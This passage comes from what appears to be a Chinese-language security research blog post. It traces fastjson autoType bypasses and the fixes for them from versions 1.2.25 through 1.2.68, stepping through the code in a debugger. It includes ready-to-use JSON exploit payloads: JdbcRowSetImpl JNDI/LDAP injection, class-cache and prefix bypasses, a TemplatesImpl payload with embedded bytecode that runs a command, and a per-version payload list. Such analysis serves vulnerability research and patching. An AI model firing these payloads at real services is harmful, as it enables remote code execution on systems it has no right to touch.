看看除了checkAutoType还有哪里调用<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531155451.png" alt="image.png"><br>如上图, 可控的只有四个, 而下面三个都是在checkAutoType中的, 无法利用, 我们聚焦于&#x3D;&#x3D;<code>MiscCodec</code>&#x3D;&#x3D;这个类中, 看一下这个类的定义<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531155729.png" alt="image.png"></p><p>很明显这是一个反序列化器的实现类, 这个反序列化器实现了对一些杂项类的反序列化, 其中包括<code>Class.class</code>:</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531160027.png" alt="image.png"><br>对于一个<code>Class.class</code>, 该反序列化器直接调用<code>TypeUtils.loadClass</code>加载<code>strVal</code>, 那我们看一下<code>strVal</code>是什么<br>往上翻可以找到这个变量的来历<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531161326.png" alt="image.png"><br>实际上就是解析json中下一条键为”val”的值, 解析到的值String时, 直接赋值给strVal,<br>也就是说如果我们构造一个json字符串:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>虽然checkAutoType禁用了<code>com.sun.</code>, 但此时并不经过checkAutoType, <code>com.sun.rowset.JdbcRowSetImpl</code>会被<code>TypeUtils.loadClass</code>直接被加载一次, 然后把这个class缓存到mappings, 下次需要加载时就不经过checkAutoType直接从mappings中get了<br>于是就有了以下payload:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://127.0.0.1:1389/ubjazx&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>当然, 也可以</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;_bytecodes&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;yv66vgAAADQAJgoAAwAPBwAhBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAR0ZXN0AQAMSW5uZXJDbGFzc2VzAQAgTEZhc3Rqc29uV2l0aFRlbXBsYXRlc0ltcGwkdGVzdDsBAApTb3VyY2VGaWxlAQAeRmFzdGpzb25XaXRoVGVtcGxhdGVzSW1wbC5qYXZhDAAEAAUHABMBAB5GYXN0anNvbldpdGhUZW1wbGF0ZXNJbXBsJHRlc3QBABBqYXZhL2xhbmcvT2JqZWN0AQAZRmFzdGpzb25XaXRoVGVtcGxhdGVzSW1wbAEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHABUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAXABgKABYAGQEABGNhbGMIABsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAdAB4KABYAHwEAE240YzE0NTY4MDc2MjAwNjUxMDABABVMbjRjMTQ1NjgwNzYyMDA2NTEwMDsBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwAjCgAkAA8AIQACACQAAAAAAAIAAQAEAAUAAQAGAAAALwABAAEAAAAFKrcAJbEAAAACAAcAAAAGAAEAAAARAAgAAAAMAAEAAAAFAAkAIgAAAAgAFAAFAAEABgAAABYAAgAAAAAACrgAGhIctgAgV7EAAAAAAAIADQAAAAIADgALAAAACgABAAIAEAAKAAk=&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span>        <span class="attr">&quot;_name&quot;</span><span class="punctuation">:</span><span class="string">&quot;a.b&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;_tfactory&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span> </span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;_outputProperties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>这个方法通杀<code>1.2.25-1.2.47</code>版本, 在AutoType默认不开启时可用</p><h3 id="AutoType开启时的绕过-利用字符前缀"><a href="#AutoType开启时的绕过-利用字符前缀" class="headerlink" title="AutoType开启时的绕过 利用字符前缀"></a>AutoType开启时的绕过 利用字符前缀</h3><p>当AutoType开启时(<code>AutoTypeSupport == true</code>), 还有另一种绕过手法, 我们回去看checkAutoType的逻辑, 当开启AutoTypeSupport或设置了期望类型时, 会走到这一步, 直接调用了loadClass<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531211345.png" alt="image.png"></p><p>但在这之前是过了一次黑名单的, 为了绕过黑名单,  在loadClass中有以下操作:<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531211721.png" alt="image.png"></p><p>当类名以<code>L</code>开头<code>;</code>结尾时, 去掉这两个字符然后loadClass, 注意此时是递归调用的, 因此可用有很多层<code>L</code>开头<code>;</code>结尾去包裹恶意类, 都是可用正常解析的, 同理<code>[</code>开头也有此操作<br>因此当开启了AutoType时, 有以下payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;LLLLcom.sun.rowset.JdbcRowSetImpl;;;;&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://127.0.0.1:1389/knwwcb&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>而对于<code>[</code>如果直接使用<code>[com.sun.rowset.JdbcRowSetImpl</code>会报错:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:1389/knwwcb&quot;, &quot;autoCommit&quot;:true&#125;</span><br><span class="line">Exception in thread &quot;main&quot; com.alibaba.fastjson.JSONException: exepct &#x27;[&#x27;, but ,, pos 42, json : &#123;&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:1389/knwwcb&quot;, &quot;autoCommit&quot;:true&#125;</span><br><span class="line">at com.alibaba.fastjson.parser.DefaultJSONParser.parseArray(DefaultJSONParser.java:669)</span><br><span class="line">at com.alibaba.fastjson.serializer.ObjectArrayCodec.deserialze(ObjectArrayCodec.java:177)</span><br><span class="line">at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:368)</span><br><span class="line">at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1327)</span><br><span class="line">at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1293)</span><br><span class="line">at com.alibaba.fastjson.JSON.parse(JSON.java:137)</span><br><span class="line">at com.alibaba.fastjson.JSON.parse(JSON.java:128)</span><br><span class="line">at FastjsonWithJdbcRowSetImpl.withAutoTypeSupportAttackVersion_1_2_25(FastjsonWithJdbcRowSetImpl.java:41)</span><br><span class="line">at FastjsonWithJdbcRowSetImpl.main(FastjsonWithJdbcRowSetImpl.java:10)</span><br></pre></td></tr></table></figure><p>打断点看看哪里出错了<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531213537.png" alt="image.png"><br>在扫描完类名后需要一个<code>[</code>, 而当前的token是16(可用点进去看, 16代表逗号<code>,</code>), 那我们在逗号前加<code>[</code>即可<br>之后又会报错<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531213830.png" alt="image.png"><br>那再加一个<code>&#123;</code>来规避这个报错<br>最后payload就是这样</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="punctuation">,</span> <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://127.0.0.1:1389/knwwcb&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>当然也可以尝试之前的TemplatesImpl</p><p>经过尝试: 对于使用<code>L ;</code>绕过, 1.2.43版本中被修复了, 但这个版本依然可以使用<code>&#123;&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[&#123;, &quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:1389/knwwcb&quot;, &quot;autoCommit&quot;:true&#125;</code>这个payload, 直到1.2.44被修复</p><p>梳理出payload适用版本:</p><p>fastjson &lt; 1.2.43</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;LLLLcom.sun.rowset.JdbcRowSetImpl;;;;&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://127.0.0.1:1389/knwwcb&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>fastjson &lt; 1.2.44</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="punctuation">,</span> <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://127.0.0.1:1389/knwwcb&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>1.2.25 &lt;&#x3D; fastjson &lt; 1.2.48</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://127.0.0.1:1389/ubjazx&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>我们来看一下这三个版本是怎么修复的</p><h3 id="fastjson-1-2-42的修复"><a href="#fastjson-1-2-42的修复" class="headerlink" title="fastjson 1.2.42的修复"></a>fastjson 1.2.42的修复</h3><p>其实在1.2.42版本中对于<code>L ;</code>绕过已经修复过一次了<br>版本改到1.2.42, 使用<code>Lcom.sun.rowset.JdbcRowSetImpl;</code>这个类名去打<br>直接去看TypeUtils.loadClass<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250601000340.png" alt="image.png"><br>可以看见先对className的第一个字母和最后一个字母做了一次哈希, 如果值为<code>0x9198507b5af98f0L</code>则切割掉这两个字符, 很明显就是不允许类名前面为<code>L</code>后面为<code>;</code><br>这个版本切割得到的类名也不再是在明文的黑名单中去比较, 而是改成了哈希值列表<code>denyHashCodes</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">0 = -8720046426850100497</span><br><span class="line">1 = -8109300701639721088</span><br><span class="line">2 = -7966123100503199569</span><br><span class="line">3 = -7766605818834748097</span><br><span class="line">4 = -6835437086156813536</span><br><span class="line">5 = -4837536971810737970</span><br><span class="line">6 = -4082057040235125754</span><br><span class="line">7 = -2364987994247679115</span><br><span class="line">8 = -1872417015366588117</span><br><span class="line">10 = -190281065685395680</span><br><span class="line">9 = -254670111376247151</span><br><span class="line">11 = 33238344207745342</span><br><span class="line">12 = 313864100207897507</span><br><span class="line">13 = 1203232727967308606</span><br><span class="line">14 = 1502845958873959152</span><br><span class="line">15 = 3547627781654598988</span><br><span class="line">16 = 3730752432285826863</span><br><span class="line">17 = 3794316665763266033</span><br><span class="line">18 = 4147696707147271408</span><br><span class="line">19 = 5347909877633654828</span><br><span class="line">20 = 5450448828334921485</span><br><span class="line">21 = 5751393439502795295</span><br><span class="line">22 = 5944107969236155580</span><br><span class="line">23 = 6742705432718011780</span><br><span class="line">24 = 7179336928365889465</span><br><span class="line">25 = 7442624256860549330</span><br><span class="line">26 = 8838294710098435315</span><br></pre></td></tr></table></figure><p>把我们的<code>Lcom.sun.rowset.JdbcRowSetImpl;</code>净化为<code>com.sun.rowset.JdbcRowSetImpl</code>再hash后去在中查找, 很明显denyHashCodes中是有这个类对应的hash值的, 但是这样的过滤无济于事, 前面说过, loadClass在处理<code>L ;</code>时是递归的, 这里双写或者多加几层就绕过去了</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;LLLLcom.sun.rowset.JdbcRowSetImpl;;;;&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://127.0.0.1:1389/knwwcb&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>还有这个denyHashCodes列表, 在网上也有大牛进行了爆破, 参考</p><p><strong><a href="https://github.com/LeadroyaL/fastjson-blacklist">fastjson-blacklist</a></strong></p><h3 id="fastjson-1-2-43的修复"><a href="#fastjson-1-2-43的修复" class="headerlink" title="fastjson 1.2.43的修复"></a>fastjson 1.2.43的修复</h3><p>这个版本对前面的双写又进行了修复<br>版本改到1.2.43, 直接去看TypeUtils.loadClass<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531234452.png" alt="image.png"></p><p>在checkAutoType又中添加了一层判断, 在出现<code>L</code>开头, <code>;</code>结尾的情况下, 出现<code>LL</code>开头就抛出错误, 这样就不能多层<code>L ;</code>绕过了. 但是别忘了, 我们还可以嵌套一层<code>[</code>来绕过</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="punctuation">,</span> <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://127.0.0.1:1389/knwwcb&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;[Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="punctuation">,</span> <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://127.0.0.1:1389/knwwcb&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="fastjson-1-2-44的修复"><a href="#fastjson-1-2-44的修复" class="headerlink" title="fastjson 1.2.44的修复"></a>fastjson 1.2.44的修复</h3><p>同样地, 拿上个版本的payload去打, 看看怎么回事<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250601003546.png" alt="image.png"><br>很明显这里不让<code>[</code>开头了, 第907行也不让<code>;</code>结尾了, 这条路算是堵死了, 当然了, 这个版本我们依然可以使用上面的缓存机制绕过</p><h3 id="fastjson-1-2-48的修复"><a href="#fastjson-1-2-48的修复" class="headerlink" title="fastjson 1.2.48的修复"></a>fastjson 1.2.48的修复</h3><p>在这个版本我们依旧尝试之前的缓存绕过来打, 看看报什么错, 由于可控的<code>mappings.put</code>是在TypeUtils.loadClass中的, 我们把断点打在loadClass中,<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250601135215.png" alt="image.png"><br>如上图. 可以看见这里加了一个参数<code>cache</code>默认为<code>false</code>, 不进行缓存, 往回调看前一个调用栈<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250601135346.png" alt="image.png"><br>cache的值是写死在MiscCodec类中的, 导致不缓存加载过的危险类</p><h2 id="fastjson-1-2-68-期望类利用-AutoCloseable"><a href="#fastjson-1-2-68-期望类利用-AutoCloseable" class="headerlink" title="fastjson 1.2.68 期望类利用(AutoCloseable)"></a>fastjson 1.2.68 期望类利用(AutoCloseable)</h2><p>在1.2.48中已经修复了缓存机制的绕过, 而在1.2.68中又爆出了新的利用方式, 利用expectClass<br>实现了<code>java.lang.AutoCloseable</code>接口的类可以被反序列化</p><p>&#x3D;&#x3D;为什么<code>java.lang.AutoCloseable</code>的实现类会被利用?&#x3D;&#x3D;<br>一些文件操作的类是实现了<code>java.lang.AutoCloseable</code>接口的, 在浅蓝师傅的文章中提到可以去挖掘文件操作的类作为新的gadget:</p><p><a href="https://b1ue.cn/archives/382.html">fastjson 1.2.68 autotype bypass 反序列化漏洞 gadget 的一种挖掘思路</a></p><p>本篇只讨论fastjosn本身的绕过, 不研究gadget(懒..</p><p>这里用下面的demo来测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">AttackVersion_1_2_68</span><span class="params">(String cmd)</span> &#123;  </span><br><span class="line">    <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\&quot;@type\&quot;:\&quot;EvilClass.VulAutoCloseable\&quot;,\&quot;cmd\&quot;:\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;&#125;&quot;</span>;  </span><br><span class="line">    System.out.println(poc);  </span><br><span class="line">    <span class="keyword">return</span> poc;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> EvilClass;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulAutoCloseable</span> <span class="keyword">implements</span> <span class="title class_">AutoCloseable</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">VulAutoCloseable</span><span class="params">(String cmd)</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            Runtime.getRuntime().exec(cmd);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;<code>java.lang.AutoCloseable</code>存在于默认的mapings中&#x3D;&#x3D;, 所以能够通过checkAutoType的检查,<br>json解析器通过<code>java.lang.AutoCloseable</code>获取对应的反序列化器为一个<code>JavaBeanDeserializer</code>(<code>config.getDeserializer</code>的逻辑是经过一系列判断后还未找到与其对应的反序列化器时, 就构造一个JavaBeanDeserializer, 即使这个类并不是一个JavaBean), <code>JavaBeanDeserializer</code>解析到后面的<code>@type</code>, 拿到对应的类名<code>EvilClass.VulAutoCloseable</code> , 又会尝试去获取<code>EvilClass.VulAutoCloseable</code>的反序列化器, 在此之前会对此类名进行<code>checkAutoType</code>检查, 此时会将<code>java.lang.AutoCloseable</code>作为期望类传入, 但这个版本AutoType会校验<code>EvilClass.VulAutoCloseable</code>和期望类, 具体如下:</p><p>期望类不能是下面几种:<br>(可以看见这里是没有禁用<code>java.lang.AutoCloseable</code>)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Object.<span class="keyword">class</span>  </span><br><span class="line"><span class="title class_">Serializable</span>.<span class="keyword">class</span>  </span><br><span class="line"><span class="title class_">Cloneable</span>.<span class="keyword">class</span>  </span><br><span class="line"><span class="title class_">Closeable</span>.<span class="keyword">class</span>  </span><br><span class="line"><span class="title class_">EventListener</span>.<span class="keyword">class</span>  </span><br><span class="line"><span class="title class_">Iterable</span>.<span class="keyword">class</span>  </span><br><span class="line"><span class="title class_">Collection</span>.class </span><br></pre></td></tr></table></figure><p><code>EvilClass.VulAutoCloseable</code>不能实现以下接口(或类继承)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java.lang.ClassLoader.class <span class="comment">// classloader is danger  </span></span><br><span class="line">javax.sql.DataSource.class <span class="comment">// dataSource can load jdbc driver  </span></span><br><span class="line">javax.sql.RowSet.class</span><br></pre></td></tr></table></figure><p>由于很多jndi的利用类都是实现了<code>javax.sql.DataSource.class</code>和<code>javax.sql.RowSet.class</code>, 这里的限制就导致了很难再进行jndi注入了</p><p>我们还是跟踪代码过一遍调试<br>前面的不必多说, 从<code>DefaultJSONParser</code>解析出<code>java.lang.AutoCloseable</code>开始<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250603100421.png" alt="image.png"><br>对<code>java.lang.AutoCloseable</code>进行checkAutoType检查, 跟进<br>&#x3D;&#x3D;<code>java.lang.AutoCloseable</code>是存在于默认的mappings中的&#x3D;&#x3D;(也就是我们再之前利用缓存绕过的那个mappings)</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250603101026.png" alt="image.png"></p><p>从mappings中拿到class, 在1374行返回<br>回到<code>DefaultJSONParser</code>, 往下走, 拿到其反序列化器, 是一个<code>JavaBeanDeserializer</code>, 跟进反序列化<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250603101420.png" alt="image.png"></p><p>再跟进, 后面json字符串扫描过程和之前一样的, 依旧是扫描到<code>@type</code>的值后再checkAutoType, 再尝试获取反序列化器<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250603102044.png" alt="image.png"><br>注意此时对<code>EvilClass.VulAutoCloseable</code>进行checkAutoType时传入了期望类<code>AutoCloseable</code> 跟进<br>这里有期望类的黑名单<br><img 